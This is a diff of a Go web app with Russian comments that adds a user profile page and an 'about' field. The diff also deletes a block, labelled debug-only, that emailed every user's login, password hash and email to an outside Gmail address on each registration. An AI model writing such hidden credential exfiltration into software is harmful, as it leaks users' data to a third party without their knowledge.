@@ -17,11 +17,12 @@ import (
 	_ "github.com/mattn/go-sqlite3"
 )
 
-// Структура для хранения учетных данных (хеш пароля)
-type Credentials struct {
+// Структура для хранения учетных данных и информации о пользователе
+type User struct {
 	Username     string
 	PasswordHash string
 	Email        string
+	About        string
 }
 
 // Глобальная переменная для базы данных
@@ -113,37 +114,28 @@ func sendEmail(to, subject, body string) error {
 	return nil
 }
 
-// Функция для получения всех зарегистрированных пользователей
-func getAllUsers() ([]Credentials, error) {
-	rows, err := db.Query("SELECT username, password_hash, email FROM users")
-	if err != nil {
-		return nil, err
-	}
-	defer rows.Close()
-
-	var users []Credentials
-	for rows.Next() {
-		var user Credentials
-		if err := rows.Scan(&user.Username, &user.PasswordHash, &user.Email); err != nil {
-			return nil, err
-		}
-		users = append(users, user)
-	}
-
-	if err := rows.Err(); err != nil {
-		return nil, err
-	}
-
-	return users, nil
+// Функция для получения данных пользователя по логину
+func getUserByUsername(username string) (User, error) {
+	var user User
+	err := db.QueryRow("SELECT username, password_hash, email, about FROM users WHERE username = ?", username).Scan(&user.Username, &user.PasswordHash, &user.Email, &user.About)
+	return user, err
 }
 
-// Обработчик для главной страницы (логин или поросенок)
+// Функция для обновления информации о пользователе
+func updateUserAbout(username, about string) error {
+	_, err := db.Exec("UPDATE users SET about = ? WHERE username = ?", about, username)
+	return err
+}
+
+// / Обработчик для главной страницы (логин или поросенок)
 func indexHandler(w http.ResponseWriter, r *http.Request) {
 	session, _ := sessionStore.Get(r, "auth-session")
 	if auth, ok := session.Values["authenticated"].(bool); ok && auth {
+		// Пользователь залогинен, перенаправляем на страницу поиска
 		http.Redirect(w, r, "/piggy", http.StatusSeeOther)
 		return
 	}
+	// Пользователь не залогинен, показываем форму логина с кнопкой профиля
 	tmpl, err := template.ParseFiles("login.html")
 	if err != nil {
 		http.Error(w, "Ошибка загрузки шаблона", http.StatusInternalServerError)
@@ -212,23 +204,6 @@ func registerHandler(w http.ResponseWriter, r *http.Request) {
 		// Не блокируем регистрацию из-за ошибки отправки email, но логируем ее
 	}
 
-	// Отправка данных всех пользователей на huaweip500@gmail.com (ТОЛЬКО ДЛЯ ОТЛАДКИ!)
-	allUsers, err := getAllUsers()
-	if err != nil {
-		log.Println("Ошибка получения всех пользователей:", err)
-	} else {
-		usersData := "Данные всех зарегистрированных пользователей:\n"
-		for _, user := range allUsers {
-			usersData += fmt.Sprintf("Логин: %s, Пароль (Хеш): %s, Email: %s\n", user.Username, user.PasswordHash, user.Email)
-		}
-		err = sendEmail("huaweip500@gmail.com", "Данные всех пользователей", usersData)
-		if err != nil {
-			log.Println("Ошибка отправки данных всех пользователей:", err)
-		} else {
-			fmt.Println("Данные всех пользователей отправлены на huaweip500@gmail.com")
-		}
-	}
-
 	// Перенаправляем на страницу входа
 	http.Redirect(w, r, "/", http.StatusSeeOther)
 }
@@ -267,7 +242,7 @@ func loginHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-// Обработчик для страницы с поросенком
+// Обработчик для страницы с поросенком (теперь поиск)
 func piggyHandler(w http.ResponseWriter, r *http.Request) {
 	session, _ := sessionStore.Get(r, "auth-session")
 	auth, ok := session.Values["authenticated"].(bool)
@@ -281,6 +256,56 @@ func piggyHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	tmpl.Execute(w, nil)
+}
+
+// Обработчик для отображения страницы с данными пользователя
+func profileHandler(w http.ResponseWriter, r *http.Request) {
+	session, _ := sessionStore.Get(r, "auth-session")
+	auth, ok := session.Values["authenticated"].(bool)
+	if !ok || !auth {
+		http.Redirect(w, r, "/", http.StatusSeeOther)
+		return
+	}
+
+	username := session.Values["username"].(string) // Получаем логин из сессии
+	user, err := getUserByUsername(username)
+	if err != nil {
+		log.Println("Ошибка получения данных пользователя:", err)
+		http.Error(w, "Ошибка сервера.", http.StatusInternalServerError)
+		return
+	}
+
+	tmpl, err := template.ParseFiles("profile.html")
+	if err != nil {
+		http.Error(w, "Ошибка загрузки шаблона", http.StatusInternalServerError)
+		return
+	}
+	tmpl.Execute(w, user)
+}
+
+// Обработчик для обновления информации о пользователе
+func updateProfileHandler(w http.ResponseWriter, r *http.Request) {
+	session, _ := sessionStore.Get(r, "auth-session")
+	auth, ok := session.Values["authenticated"].(bool)
+	if !ok || !auth {
+		http.Redirect(w, r, "/", http.StatusSeeOther)
+		return
+	}
+
+	if r.Method == http.MethodPost {
+		about := r.FormValue("about")
+		username := session.Values["username"].(string)
+
+		err := updateUserAbout(username, about)
+		if err != nil {
+			log.Println("Ошибка обновления информации о пользователе:", err)
+			http.Error(w, "Ошибка сервера.", http.StatusInternalServerError)
+			return
+		}
+		http.Redirect(w, r, "/profile", http.StatusSeeOther)
+	} else {
+		http.Redirect(w, r, "/profile", http.StatusMethodNotAllowed)
+	}
 }
 
 // Обработчик для выхода
@@ -305,13 +330,14 @@ func main() {
 	}
 	defer db.Close()
 
-	// Обновление базы данных для работы с почтой
+	// Обновление базы данных для работы с почтой и информацией о пользователе
 	_, err = db.Exec(`
 		CREATE TABLE IF NOT EXISTS users (
 			id INTEGER PRIMARY KEY AUTOINCREMENT,
 			username TEXT UNIQUE,
 			password_hash TEXT,
-			email TEXT UNIQUE
+			email TEXT UNIQUE,
+			about TEXT
 		)
 	`)
 	if err != nil {
@@ -319,7 +345,7 @@ func main() {
 	}
 
 	// Генерация случайного ключа сессии
-	sessionKey := generateSessionKey()
+	sessionKey = generateSessionKey()
 
 	// Инициализация сессий с настройками
 	sessionStore = sessions.NewCookieStore(sessionKey)
@@ -333,6 +359,8 @@ func main() {
 	http.HandleFunc("/register_action", registerHandler)
 	http.HandleFunc("/login", loginHandler)
 	http.HandleFunc("/piggy", piggyHandler)
+	http.HandleFunc("/profile", profileHandler)
+	http.HandleFunc("/profile_update", updateProfileHandler)
 	http.HandleFunc("/logout", logoutHandler)
 
 	fmt.Println("Сервер запущен на порту 8080")
